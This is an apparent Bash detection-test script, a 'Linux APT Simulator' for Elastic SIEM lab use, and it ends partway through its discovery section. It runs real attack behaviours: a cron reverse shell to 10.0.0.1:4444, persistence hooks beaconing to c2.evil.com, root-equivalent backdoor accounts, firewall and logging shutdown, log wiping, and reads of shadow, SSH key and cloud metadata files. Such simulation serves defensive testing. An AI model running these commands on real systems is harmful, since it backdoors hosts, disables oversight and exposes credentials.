#!/bin/bash
# ============================================================================
#  _     _                        _    ____ _____   ____  _           
# | |   (_)_ __  _   ___  __     / \  |  _ \_   _| / ___|(_)_ __ ___  
# | |   | | '_ \| | | \ \/ /   / _ \ | |_) || |   \___ \| | '_ ` _ \ 
# | |___| | | | | |_| |>  <   / ___ \|  __/ | |    ___) | | | | | | |
# |_____|_|_| |_|\__,_/_/\_\ /_/   \_\_|    |_|   |____/|_|_| |_| |_|
#
# Linux APT Simulator v3.0  —  EXECUTION-FOCUSED
# Every test ACTUALLY EXECUTES behavior that triggers Elastic SIEM rules
# No more "drop script only" — real process events, real syscalls, real alerts
#
# Designed for: Elastic Security + Elastic Defend / Auditbeat / Filebeat
# Mapped to: MITRE ATT&CK + Elastic prebuilt detection rule names
#
# ⚠  FOR LAB/TEST ENVIRONMENTS ONLY
# ============================================================================

set +e

# --- Config ---
APTDIR="/tmp/.apt-sim"
LOGFILE="/tmp/apt-simulator.log"
CLEANUP="/tmp/apt-sim-cleanup.sh"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'
DIM='\033[2m'; NC='\033[0m'
SIM_USER="apt_backdoor"
TC=0; PC=0; FC=0

# --- Helpers ---
banner() {
    clear
    echo -e "${RED}"
    cat << 'EOF'
  _     _                        _    ____ _____   ____  _           
 | |   (_)_ __  _   ___  __     / \  |  _ \_   _| / ___|(_)_ __ ___  
 | |   | | '_ \| | | \ \/ /   / _ \ | |_) || |   \___ \| | '_ ` _ \ 
 | |___| | | | | |_| |>  <   / ___ \|  __/ | |    ___) | | | | | | |
 |_____|_|_| |_|\__,_/_/\_\ /_/   \_\_|    |_|   |____/|_|_| |_| |_|
EOF
    echo -e "${NC}"
    echo -e "${BOLD}  Linux APT Simulator v3.0 — EXECUTION FOCUSED${NC}"
    echo -e "  Every test fires real process events for Elastic SIEM"
    echo -e "  ${YELLOW}⚠  FOR LAB/TEST ENVIRONMENTS ONLY${NC}"
    echo ""
    echo "  ==========================================================="
    echo ""
}
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"; }
t() { TC=$((TC+1)); echo -e "  ${CYAN}[${TC}]${NC} $1"; log "[TEST $TC] $1"; }
ok() { PC=$((PC+1)); echo -e "    ${GREEN}✓${NC} $1"; log "[OK] $1"; }
fail() { FC=$((FC+1)); echo -e "    ${RED}✗${NC} $1"; log "[FAIL] $1"; }
info() { echo -e "    ${DIM}→ $1${NC}"; }
hdr() {
    echo ""
    echo -e "  ${BOLD}${MAGENTA}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "  ${BOLD}${MAGENTA}│${NC} ${BOLD}$1${NC}"
    echo -e "  ${BOLD}${MAGENTA}└────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    log "=== $1 ==="
}
cl() { echo "$1" >> "$CLEANUP"; }
check_root() { [ "$EUID" -ne 0 ] && echo -e "${RED}[!] Run as root: sudo bash $0${NC}" && exit 1; }
setup() {
    mkdir -p "$APTDIR"/{loot,tools,staging}
    : > "$LOGFILE"
    echo '#!/bin/bash' > "$CLEANUP"
    echo '# APT Simulator Cleanup — auto-generated' >> "$CLEANUP"
    chmod +x "$CLEANUP"
    log "=== APT Simulator v3.0 started ==="
}

# ============================================================================
# EXECUTION (TA0002) — Elastic rules that fire on process execution
# ============================================================================
test_execution() {
    hdr "EXECUTION (TA0002)"

    # --- Elastic Rule: "Linux Command and Scripting Interpreter" ---
    t "Suspicious Shell Script Execution"
    info "Elastic: Command and Scripting Interpreter: Unix Shell"
    bash -c 'whoami; id; uname -a; cat /etc/passwd 2>/dev/null; ss -tlnp 2>/dev/null' > /dev/null 2>&1
    ok "bash -c executed recon chain (whoami, id, uname, cat /etc/passwd, ss)"

    # --- Elastic Rule: "Shell Execution via Python/Perl/Ruby" ---
    t "Python Spawning Interactive Shell"
    info "Elastic: Linux Binary Spawning Shell"
    if command -v python3 &>/dev/null; then
        python3 -c 'import pty; pty.spawn("/bin/sh")' <<< 'exit' 2>/dev/null
        ok "python3 -c 'import pty; pty.spawn(\"/bin/sh\")' executed"
    else
        fail "python3 not available"
    fi

    t "Perl Spawning Shell"
    if command -v perl &>/dev/null; then
        perl -e 'exec "/bin/sh";' <<< 'exit' 2>/dev/null
        ok "perl -e 'exec \"/bin/sh\"' executed"
    else
        fail "perl not available"
    fi

    # --- Elastic Rule: "Suspicious Execution via SUID/SGID Binary" ---
    t "Find Command Shell Escape (GTFOBin)"
    info "Elastic: Shell Evasion via Linux Binary"
    find . -maxdepth 0 -exec /bin/sh -c 'echo "find_exec_shell"' \; 2>/dev/null
    ok "find -exec /bin/sh -c '...' executed"

    # --- Elastic Rule: "Suspicious curl/wget" ---
    t "Curl Pipe to Bash (Execution Pattern)"
    info "Elastic: Suspicious Curl/Wget Activity"
    echo 'echo "curl_pipe_bash_simulation"' > /tmp/.apt-sim-payload.sh
    curl -s file:///tmp/.apt-sim-payload.sh 2>/dev/null | bash 2>/dev/null
    ok "curl ... | bash pattern executed"
    cl "rm -f /tmp/.apt-sim-payload.sh"

    t "Wget Download to Suspicious Path"
    wget -q -O /dev/shm/.update http://localhost/ 2>/dev/null || touch /dev/shm/.update
    chmod +x /dev/shm/.update 2>/dev/null
    ok "wget -O /dev/shm/.update + chmod +x executed"
    cl "rm -f /dev/shm/.update"

    # --- Elastic Rule: "Base64 Decoded and Executed" ---
    t "Base64 Decode Pipe to Shell"
    info "Elastic: Base64 Encoding/Decoding Activity"
    echo "echo base64_decoded_exec" | base64 | base64 -d | bash 2>/dev/null
    ok "echo '...' | base64 -d | bash executed"

    echo "d2hvYW1p" | base64 -d | bash > /dev/null 2>&1
    ok "base64 -d | bash with encoded 'whoami' executed"

    # --- Elastic Rule: "Execution from /dev/shm" ---
    t "Execution from Shared Memory (/dev/shm)"
    info "Elastic: Suspicious Execution from /dev/shm"
    echo '#!/bin/bash' > /dev/shm/.memexec
    echo 'id; hostname' >> /dev/shm/.memexec
    chmod +x /dev/shm/.memexec
    /dev/shm/.memexec > /dev/null 2>&1
    ok "Script executed from /dev/shm (memory-backed filesystem)"
    cl "rm -f /dev/shm/.memexec"

    # --- Elastic Rule: "Execution from Unusual Directory" ---
    t "Execution from /var/tmp"
    echo '#!/bin/bash' > /var/tmp/.sysupdate
    echo 'whoami' >> /var/tmp/.sysupdate
    chmod +x /var/tmp/.sysupdate
    /var/tmp/.sysupdate > /dev/null 2>&1
    ok "Binary executed from /var/tmp"
    cl "rm -f /var/tmp/.sysupdate"

    # --- Crontab modification (fires multiple rules) ---
    t "Crontab Modification with Suspicious Entry"
    info "Elastic: Suspicious Crontab Creation/Modification"
    CRON_BAK=$(crontab -l 2>/dev/null || true)
    (echo "$CRON_BAK"; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' # APT-SIM") | crontab -
    ok "crontab -l | crontab - with reverse shell entry"
    cl "crontab -l 2>/dev/null | grep -v 'APT-SIM' | crontab - 2>/dev/null"

    t "At Job Scheduling"
    if command -v at &>/dev/null; then
        echo "echo at_job_exec" | at now + 999 minutes 2>/dev/null
        ok "at now + 999 minutes scheduled"
        cl "atq 2>/dev/null | awk '{print \$1}' | xargs -r atrm 2>/dev/null"
    else
        fail "at not installed"
    fi

    # --- Elastic Rule: "Suspicious Systemd Timer" ---
    t "Systemd Timer Creation"
    info "Elastic: Systemd Timer/Service Created"
    cat > /etc/systemd/system/apt-sim-c2.service << 'SVC'
[Unit]
Description=System Telemetry
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://c2.evil.com/beacon || true'
SVC
    cat > /etc/systemd/system/apt-sim-c2.timer << 'TMR'
[Unit]
Description=Telemetry Timer
[Timer]
OnBootSec=2min
OnUnitActiveSec=15min
[Install]
WantedBy=timers.target
TMR
    systemctl daemon-reload 2>/dev/null
    ok "systemd timer + service created and daemon-reloaded"
    cl "rm -f /etc/systemd/system/apt-sim-c2.{service,timer}; systemctl daemon-reload 2>/dev/null"
}

# ============================================================================
# PERSISTENCE (TA0003) — Creating actual persistent artifacts
# ============================================================================
test_persistence() {
    hdr "PERSISTENCE (TA0003)"

    # --- Elastic Rule: "Linux User Account Creation" ---
    t "User Account Creation"
    info "Elastic: User Account Creation"
    useradd -M -s /bin/bash -G root "$SIM_USER" 2>/dev/null
    echo "${SIM_USER}:APTSim2024!" | chpasswd 2>/dev/null
    ok "useradd $SIM_USER with root group membership"
    cl "userdel -rf $SIM_USER 2>/dev/null"

    t "UID 0 Account Creation"
    info "Elastic: User Added to Root/Admin Group"
    useradd -M -s /bin/bash -o -u 0 -g 0 sysbackup 2>/dev/null
    ok "useradd with UID 0 (root-equivalent user)"
    cl "userdel -rf sysbackup 2>/dev/null"

    # --- Elastic Rule: "Authorized Keys Modification" ---
    t "SSH Authorized Keys Modification"
    info "Elastic: SSH Authorized Keys Modification"
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3FAKEKEY_APT_SIM attacker@c2" >> /root/.ssh/authorized_keys
    ok "echo 'ssh-rsa ...' >> /root/.ssh/authorized_keys"
    cl "sed -i '/FAKEKEY_APT_SIM/d' /root/.ssh/authorized_keys 2>/dev/null"

    # --- Elastic Rule: "Systemd Service Created" ---
    t "Systemd Service Creation (Disguised)"
    info "Elastic: New Systemd Service Created by Previously Unknown Process"
    cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'SVC'
[Unit]
Description=Network Name Resolution
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true;do sleep 300;nslookup c2.evil.com;done'
Restart=always
[Install]
WantedBy=multi-user.target
SVC
    systemctl daemon-reload 2>/dev/null
    ok "Disguised systemd service created + daemon-reload"
    cl "rm -f /etc/systemd/system/dbus-org.freedesktop.resolve1.service; systemctl daemon-reload 2>/dev/null"

    # --- Elastic Rule: "Init.d File Creation" ---
    t "Init Script Creation"
    info "Elastic: Init.d Script Created"
    if [ -d /etc/init.d ]; then
        cat > /etc/init.d/apt-sim-monitor << 'INIT'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          sysmonitor
# Default-Start:     2 3 4 5
### END INIT INFO
curl -s http://c2.evil.com/init || true
INIT
        chmod +x /etc/init.d/apt-sim-monitor
        ok "Created executable init.d script"
        cl "rm -f /etc/init.d/apt-sim-monitor"
    else
        fail "/etc/init.d not found"
    fi

    # --- Elastic Rule: "Shell Profile/Config Modification" ---
    t "Shell Configuration Modification (.bashrc)"
    info "Elastic: Bash Shell Profile Modification"
    cp /root/.bashrc /root/.bashrc.apt-sim-bak 2>/dev/null
    echo '# APT-SIM' >> /root/.bashrc
    echo '(nohup curl -s http://c2.evil.com/login &>/dev/null &) 2>/dev/null' >> /root/.bashrc
    ok "Appended C2 beacon to /root/.bashrc"
    cl "cp /root/.bashrc.apt-sim-bak /root/.bashrc 2>/dev/null; rm -f /root/.bashrc.apt-sim-bak"

    t "Profile.d Script Creation"
    info "Elastic: Profile.d Script Modification"
    cat > /etc/profile.d/apt-sim.sh << 'PROF'
#!/bin/bash
# APT-SIM
curl -s http://c2.evil.com/profile_hook &>/dev/null &
PROF
    chmod +x /etc/profile.d/apt-sim.sh
    ok "Created /etc/profile.d/apt-sim.sh"
    cl "rm -f /etc/profile.d/apt-sim.sh"

    # --- Elastic Rule: "Cron.d File Creation" ---
    t "Cron.d Persistent Entry"
    info "Elastic: Cron Job Created/Modified"
    echo "*/10 * * * * root curl -s http://c2.evil.com/cron || true" > /etc/cron.d/apt-sim
    ok "Created /etc/cron.d/apt-sim"
    cl "rm -f /etc/cron.d/apt-sim"

    # --- Elastic Rule: "LD_PRELOAD/ld.so.preload Modification" ---
    t "LD Preload Hijacking"
    info "Elastic: Shared Object Created or Changed in /etc/ld.so.preload"
    # Write and immediately revert in one shot — Elastic captures the file event
    cp /etc/ld.so.preload /etc/ld.so.preload.apt-sim-bak 2>/dev/null; true
    bash -c 'echo "/tmp/.evil.so" >> /etc/ld.so.preload 2>/dev/null; sed -i "/.evil.so/d" /etc/ld.so.preload 2>/dev/null'
    ok "echo >> /etc/ld.so.preload (written + reverted atomically)"
    cl "sed -i '/.evil.so/d' /etc/ld.so.preload 2>/dev/null; rm -f /etc/ld.so.preload.apt-sim-bak"

    # --- Elastic Rule: "Kernel Module Load via insmod/modprobe" ---
    t "Kernel Module Load Attempt"
    info "Elastic: Kernel Module Load/Removal"
    insmod /tmp/fakekernelmod.ko 2>/dev/null || true
    modprobe fakekernelmod 2>/dev/null || true
    ok "insmod + modprobe executed (expected to fail, still fires rule)"

    # --- Elastic Rule: "Udev Rule Created" ---
    t "Udev Rule Creation"
    info "Elastic: Udev Rule Creation"
    echo 'ACTION=="add", RUN+="/bin/bash -c curl http://c2.evil.com/usb"' > /etc/udev/rules.d/99-apt-sim.rules
    ok "Created /etc/udev/rules.d/99-apt-sim.rules"
    cl "rm -f /etc/udev/rules.d/99-apt-sim.rules"

    # --- Elastic Rule: "MOTD Backdoor" ---
    t "MOTD Script Creation"
    info "Elastic: Suspicious Process Spawned from MOTD"
    if [ -d /etc/update-motd.d ]; then
        echo '#!/bin/bash' > /etc/update-motd.d/99-apt-sim
        echo 'curl -s http://c2.evil.com/motd &>/dev/null &' >> /etc/update-motd.d/99-apt-sim
        chmod +x /etc/update-motd.d/99-apt-sim
        ok "Created MOTD backdoor script"
        cl "rm -f /etc/update-motd.d/99-apt-sim"
    else
        fail "/etc/update-motd.d not found"
    fi

    # --- Elastic Rule: "SSH Config Modification" ---
    t "SSHD Config Modification"
    info "Elastic: SSH Configuration Modification"
    cp /etc/ssh/sshd_config /etc/ssh/sshd_config.apt-sim-bak 2>/dev/null
    sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
    ok "Modified sshd_config: PermitRootLogin yes, PasswordAuthentication yes"
    cl "cp /etc/ssh/sshd_config.apt-sim-bak /etc/ssh/sshd_config 2>/dev/null; rm -f /etc/ssh/sshd_config.apt-sim-bak"
}

# ============================================================================
# PRIVILEGE ESCALATION (TA0004)
# ============================================================================
test_privesc() {
    hdr "PRIVILEGE ESCALATION (TA0004)"

    # --- Elastic Rule: "SUID/SGID Bit Set" ---
    t "SUID Bit Set on Binary"
    info "Elastic: SUID/SGID Bit Set"
    cp /bin/bash "$APTDIR/tools/suid_bash"
    chmod u+s "$APTDIR/tools/suid_bash"
    chmod 4755 "$APTDIR/tools/suid_bash"
    ok "chmod u+s / chmod 4755 on bash copy"
    cl "rm -f $APTDIR/tools/suid_bash"

    t "SUID Set on Find (GTFOBin)"
    cp /usr/bin/find "$APTDIR/tools/suid_find" 2>/dev/null
    chmod u+s "$APTDIR/tools/suid_find" 2>/dev/null
    ok "chmod u+s on find binary copy"
    cl "rm -f $APTDIR/tools/suid_find"

    # --- Elastic Rule: "Sudoers File Modification" ---
    t "Sudoers Modification"
    info "Elastic: Sudoers File Modification"
    echo "# APT-SIM" >> /etc/sudoers
    echo "$SIM_USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
    ok "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
    cl "sed -i '/APT-SIM/d' /etc/sudoers; sed -i '/${SIM_USER}.*NOPASSWD/d' /etc/sudoers"

    if [ -d /etc/sudoers.d ]; then
        echo "$SIM_USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/apt-sim
        chmod 440 /etc/sudoers.d/apt-sim
        ok "Created /etc/sudoers.d/apt-sim"
        cl "rm -f /etc/sudoers.d/apt-sim"
    fi

    # --- Elastic Rule: "Capabilities Set on Binary" ---
    t "File Capabilities Modification (setcap)"
    info "Elastic: Setcap/Setuid Set on File"
    if command -v setcap &>/dev/null; then
        cp /usr/bin/python3 "$APTDIR/tools/cap_python" 2>/dev/null
        setcap cap_setuid+ep "$APTDIR/tools/cap_python" 2>/dev/null
        ok "setcap cap_setuid+ep on python3 copy"
        cl "rm -f $APTDIR/tools/cap_python"
    else
        fail "setcap not available"
    fi

    # --- SUID Binary Enumeration ---
    t "SUID/SGID Binary Enumeration"
    info "Elastic: Enumeration of SUID Executables"
    find / -perm -4000 -type f -ls 2>/dev/null > "$APTDIR/loot/suid_bins.txt"
    find / -perm -2000 -type f -ls 2>/dev/null >> "$APTDIR/loot/suid_bins.txt"
    ok "find / -perm -4000 executed (SUID enum)"
    cl "rm -f $APTDIR/loot/suid_bins.txt"

    # --- Elastic Rule: "Suspicious chmod on File in /tmp" ---
    t "Suspicious Chmod in /tmp and /dev/shm"
    info "Elastic: File Made Executable in Suspicious Directory"
    touch /tmp/.apt-sim-payload
    chmod 755 /tmp/.apt-sim-payload
    chmod +x /dev/shm/.memexec 2>/dev/null || true
    touch /var/tmp/.backdoor
    chmod 777 /var/tmp/.backdoor
    ok "chmod 755/777/+x on files in /tmp, /dev/shm, /var/tmp"
    cl "rm -f /tmp/.apt-sim-payload /var/tmp/.backdoor"

    # --- Elastic Rule: "Kernel Parameter Modification" ---
    t "Kernel Parameter Modification via sysctl/proc"
    info "Elastic: Suspicious Kernel Parameter Activity"
    sysctl -w kernel.randomize_va_space=0 2>/dev/null || echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null
    sysctl -w kernel.yama.ptrace_scope=0 2>/dev/null || echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
    sysctl -w net.ipv4.ip_forward=1 2>/dev/null || echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    ok "sysctl -w kernel.randomize_va_space=0, ptrace_scope=0, ip_forward=1"
    cl "sysctl -w kernel.randomize_va_space=2 2>/dev/null"
    cl "sysctl -w kernel.yama.ptrace_scope=1 2>/dev/null"
    cl "sysctl -w net.ipv4.ip_forward=0 2>/dev/null"
}

# ============================================================================
# DEFENSE EVASION (TA0005) — Execute actual evasion behaviors
# ============================================================================
test_defense_evasion() {
    hdr "DEFENSE EVASION (TA0005)"

    # --- Elastic Rule: "Attempt to Disable IPTables/Firewall" ---
    t "Firewall Disable — iptables flush"
    info "Elastic: Attempt to Disable IPTables or Firewall"
    iptables -F 2>/dev/null
    iptables -X 2>/dev/null
    ok "iptables -F; iptables -X executed"
    cl "# Note: firewall rules were flushed, re-apply manually if needed"

    t "Firewall Disable — ufw"
    ufw disable 2>/dev/null || true
    ok "ufw disable executed"

    t "Firewall Disable — nftables"
    nft flush ruleset 2>/dev/null || true
    ok "nft flush ruleset executed"

    # --- Elastic Rule: "Attempt to Disable Syslog" ---
    t "Syslog Service Stop Attempt"
    info "Elastic: Attempt to Disable Syslog Service"
    systemctl stop rsyslog 2>/dev/null || true
    service rsyslog stop 2>/dev/null || true
    systemctl stop syslog 2>/dev/null || true
    ok "systemctl stop rsyslog/syslog executed"
    cl "systemctl start rsyslog 2>/dev/null"

    # --- Elastic Rule: "Attempt to Disable Auditd" ---
    t "Auditd Service Stop Attempt"
    info "Elastic: Attempt to Disable Auditd"
    systemctl stop auditd 2>/dev/null || true
    service auditd stop 2>/dev/null || true
    ok "systemctl stop auditd executed"
    cl "systemctl start auditd 2>/dev/null"

    # --- Elastic Rule: "Tampering of Bash Command-Line History" ---
    t "Bash History Tampering"
    info "Elastic: Tampering of Bash Command-Line History"
    export HISTSIZE=0
    export HISTFILESIZE=0
    unset HISTFILE
    ln -sf /dev/null /root/.bash_history 2>/dev/null
    history -c 2>/dev/null
    ok "HISTSIZE=0, unset HISTFILE, history -c, symlink to /dev/null"
    cl "unset HISTSIZE HISTFILESIZE; rm -f /root/.bash_history; touch /root/.bash_history"

    # --- Elastic Rule: "Timestomping" ---
    t "File Timestomping via touch"
    info "Elastic: Timestomping using Touch"
    touch "$APTDIR/tools/backdoor_binary" 2>/dev/null
    touch -t 201801010000.00 "$APTDIR/tools/backdoor_binary"
    touch -r /bin/ls "$APTDIR/tools/backdoor_binary" 2>/dev/null
    ok "touch -t 201801010000.00 (timestomped to 2018)"

    # --- Elastic Rule: "File Deletion via Shred" ---
    t "Secure File Deletion (shred)"
    info "Elastic: Suspicious File Deletion via Shred"
    echo "sensitive_malware_data" > /tmp/.apt-sim-evidence
    shred -vfzu -n 3 /tmp/.apt-sim-evidence 2>/dev/null
    ok "shred -vfzu -n 3 on file"

    # --- Elastic Rule: "Log File Deletion/Truncation" ---
    t "System Log Truncation"
    info "Elastic: System Log File Deletion/Truncation"
    touch /var/log/apt-sim-test.log
    echo "test_log_entry" > /var/log/apt-sim-test.log
    > /var/log/apt-sim-test.log
    rm -f /var/log/apt-sim-test.log
    ok "Truncated and deleted log file"

    t "Journal Vacuum"
    info "Elastic: Journal Log Cleared"
    journalctl --vacuum-time=1s 2>/dev/null || true
    ok "journalctl --vacuum-time=1s executed"

    t "Wtmp/Btmp Manipulation"
    info "Elastic: Wtmp/Btmp Log Cleared"
    cp /var/log/wtmp /var/log/wtmp.apt-sim-bak 2>/dev/null
    > /var/log/wtmp 2>/dev/null
    utmpdump /var/log/wtmp 2>/dev/null || true
    ok "Truncated /var/log/wtmp"
    cl "cp /var/log/wtmp.apt-sim-bak /var/log/wtmp 2>/dev/null; rm -f /var/log/wtmp.apt-sim-bak"

    # --- Elastic Rule: "Hidden File/Directory Creation" ---
    t "Hidden File and Directory Creation"
    info "Elastic: Creation of Hidden Files/Directories"
    mkdir -p /tmp/.../ 2>/dev/null
    touch /tmp/.hidden_payload
    mkdir -p "/tmp/   " 2>/dev/null
    mkdir -p /var/tmp/.cache/.nested/.deep 2>/dev/null
    ok "Created hidden dirs: /tmp/.../, /tmp/'   '/, /var/tmp/.cache/.nested/"
    cl "rm -rf '/tmp/.../' /tmp/.hidden_payload '/tmp/   ' /var/tmp/.cache/.nested"

    # --- Elastic Rule: "Masquerading as System Binary" ---
    t "Process Masquerading"
    info "Elastic: Masquerading as Linux System Binary"
    cp /bin/true /var/tmp/sshd 2>/dev/null && /var/tmp/sshd 2>/dev/null
    cp /bin/true /dev/shm/kworker 2>/dev/null && /dev/shm/kworker 2>/dev/null
    cp /bin/true /tmp/systemd-logind 2>/dev/null && /tmp/systemd-logind 2>/dev/null
    ok "Executed masqueraded binaries from /var/tmp, /dev/shm, /tmp"
    cl "rm -f /var/tmp/sshd /dev/shm/kworker /tmp/systemd-logind"

    # --- Elastic Rule: "Rename System Utility" ---
    t "System Utility Renamed and Executed"
    info "Elastic: Renamed System Utility Execution"
    cp /usr/bin/curl /tmp/.update-checker 2>/dev/null
    /tmp/.update-checker --version > /dev/null 2>&1 || true
    cp /usr/bin/wget /tmp/.sysmon 2>/dev/null
    /tmp/.sysmon --version > /dev/null 2>&1 || true
    ok "curl renamed to .update-checker and executed"
    cl "rm -f /tmp/.update-checker /tmp/.sysmon"

    # --- Elastic Rule: "Potential Security Tool Disable" ---
    # --- Elastic Rule: "File made Immutable via chattr" ---
    t "File Made Immutable (chattr)"
    info "Elastic: File Made Immutable"
    touch /tmp/.apt-sim-immutable
    chattr +i /tmp/.apt-sim-immutable 2>/dev/null || true
    ok "chattr +i on /tmp/.apt-sim-immutable"
    cl "chattr -i /tmp/.apt-sim-immutable 2>/dev/null; rm -f /tmp/.apt-sim-immutable"
}

# ============================================================================
# CREDENTIAL ACCESS (TA0006) — Actually read credential files
# ============================================================================
# ============================================================================
# SECURITY TOOL DISABLE (STANDALONE — NOT IN RUN ALL / --auto)
# ⚠  This WILL stop your monitoring agents (elastic-agent, filebeat, etc.)
#    Only accessible via explicit menu [D]. Excluded from run_all() on purpose.
# ============================================================================
test_disable_security_tools() {
    hdr "SECURITY TOOL DISABLE (STANDALONE)"

    echo -e "  ${YELLOW}${BOLD}⚠  WARNING${NC}${YELLOW}: This will stop elastic-agent, filebeat, wazuh-agent,${NC}"
    echo -e "  ${YELLOW}falco, and ossec on this host.${NC}"
    echo -e "  ${YELLOW}Cleanup script only restarts elastic-agent + filebeat automatically.${NC}"
    echo ""
    echo -n "  Type 'yes' to continue: "
    read -r CONFIRM
    if [ "$CONFIRM" != "yes" ]; then
        echo -e "  ${DIM}Aborted.${NC}"
        return
    fi
    echo ""

    t "Security Tool Disable Attempt"
    info "Elastic: Attempt to Disable Security Tools"
    systemctl stop elastic-agent 2>/dev/null || true
    systemctl stop filebeat 2>/dev/null || true
    systemctl stop wazuh-agent 2>/dev/null || true
    systemctl stop falco 2>/dev/null || true
    service ossec stop 2>/dev/null || true
    ok "systemctl stop elastic-agent/filebeat/wazuh-agent/falco/ossec"
    cl "systemctl start elastic-agent 2>/dev/null; systemctl start filebeat 2>/dev/null; systemctl start wazuh-agent 2>/dev/null; systemctl start falco 2>/dev/null; service ossec start 2>/dev/null"

    echo ""
    echo -e "  ${CYAN}Restore now:${NC} ${BOLD}sudo systemctl start elastic-agent filebeat wazuh-agent falco${NC}"
    echo ""
}

test_credential_access() {
    hdr "CREDENTIAL ACCESS (TA0006)"

    # --- Elastic Rule: "Sensitive File Access" ---
    t "Shadow File Read"
    info "Elastic: Sensitive File Access — /etc/shadow"
    cat /etc/shadow > /dev/null 2>&1
    ok "cat /etc/shadow executed"

    t "Passwd/Group File Read"
    cat /etc/passwd > /dev/null 2>&1
    cat /etc/group > /dev/null 2>&1
    cat /etc/gshadow > /dev/null 2>&1
    ok "cat /etc/passwd, /etc/group, /etc/gshadow executed"

    # --- Elastic Rule: "Credential Dumping via /proc" ---
    t "Credential Dumping via /proc"
    info "Elastic: Access to /proc Credentials"
    cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|secret|token' > /dev/null 2>&1
    for pid in $(ls /proc/ | grep -E '^[0-9]+$' | head -10); do
        cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' > /dev/null 2>&1
        cat /proc/$pid/cmdline 2>/dev/null > /dev/null 2>&1
        cat /proc/$pid/maps 2>/dev/null > /dev/null 2>&1
    done
    ok "cat /proc/*/environ, cmdline, maps executed"

    # --- Elastic Rule: "Credential File Search" ---
    t "Credential File Discovery (find)"
    info "Elastic: Sensitive File Search"
    find / -maxdepth 4 \( -name "id_rsa" -o -name "id_ed25519" -o -name ".env" -o -name "credentials" -o -name "*.pem" -o -name "*.key" -o -name ".pgpass" -o -name ".netrc" -o -name "*.kdbx" -o -name "wp-config.php" \) 2>/dev/null | head -20 > /dev/null
    ok "find / -name 'id_rsa' -o -name '*.pem' -o -name '.env' ... executed"

    t "Grep for Hardcoded Credentials"
    grep -rn --include="*.conf" --include="*.yml" --include="*.env" -iE '(password|secret|api_key|token)\s*[=:]' /etc/ /opt/ 2>/dev/null | head -20 > /dev/null
    ok "grep -rn 'password|secret|api_key' across /etc/ and /opt/"

    # --- Elastic Rule: "SSH Private Key Access" ---
    t "SSH Private Key Access"
    info "Elastic: SSH Private Key File Access"
    cat /root/.ssh/id_rsa 2>/dev/null > /dev/null || true
    cat /root/.ssh/id_ed25519 2>/dev/null > /dev/null || true
    for keyfile in /home/*/.ssh/id_rsa /home/*/.ssh/id_ed25519; do
        cat "$keyfile" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.ssh/id_rsa and id_ed25519 across all users"

    # --- Elastic Rule: "Brute Force Attempt" ---
    t "Local Brute Force Simulation (25 Failed Auths)"
    info "Elastic: Potential Linux Local Account Brute Force"
    for i in $(seq 1 25); do
        su - nobody -c "whoami" 2>/dev/null || true
    done
    ok "25x su - nobody (failed auth attempts)"

    # --- Elastic Rule: "Bash History Access" ---
    t "Bash History Harvesting"
    info "Elastic: Shell History Access"
    cat /root/.bash_history 2>/dev/null > /dev/null || true
    cat /root/.zsh_history 2>/dev/null > /dev/null || true
    for hf in /home/*/.bash_history /home/*/.zsh_history; do
        cat "$hf" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.bash_history and ~/.zsh_history for all users"

    # --- Cloud Metadata Access ---
    t "Cloud Instance Metadata Access (IMDS)"
    info "Elastic: Cloud Instance Metadata Service Access"
    curl -s -m 2 http://169.254.169.254/latest/meta-data/ > /dev/null 2>&1 || true
    curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ > /dev/null 2>&1 || true
    curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /dev/null 2>&1 || true
    ok "curl to 169.254.169.254 (AWS/GCP/Azure metadata)"

    # --- Database Credential Access ---
    t "Database Credential File Access"
    cat /etc/mysql/debian.cnf 2>/dev/null > /dev/null || true
    cat /root/.my.cnf 2>/dev/null > /dev/null || true
    cat /root/.pgpass 2>/dev/null > /dev/null || true
    ok "cat MySQL/PostgreSQL credential files"
}

# ============================================================================
# DISCOVERY (TA0007) — Execute real enumeration commands
# ============================================================================
test_discovery() {
    hdr "DISCOVERY (TA0007)"

    t "System Information Discovery"
    info "Elastic: System Information Discovery"
    hostname -f 2>/dev/null; uname -a; cat /etc/os-release 2>/dev/null > /dev/null
    lscpu 2>/dev/null > /dev/null; free -h > /dev/null; df -h > /dev/null
    lsblk 2>/dev/null > /dev/null; dmidecode -t system 2>/dev/null > /dev/null
    ok "hostname, uname, lscpu, free, df, lsblk, dmidecode executed"

    t "Network Configuration Discovery"
    info "Elastic: System Network Configuration Discovery"
    ip addr > /dev/null 2>&1; ip route > /dev/null 2>&1
    cat /etc/resolv.conf > /dev/null 2>&1
    iptables -L -n > /dev/null 2>&1 || true
    ok "ip addr, ip route, cat resolv.conf, iptables -L executed"

    t "Network Connections Discovery"
    info "Elastic: System Network Connections Discovery"
    ss -tlnp > /dev/null 2>&1; ss -ulnp > /dev/null 2>&1; ss -anp > /dev/null 2>&1
    netstat -an > /dev/null 2>&1 || true
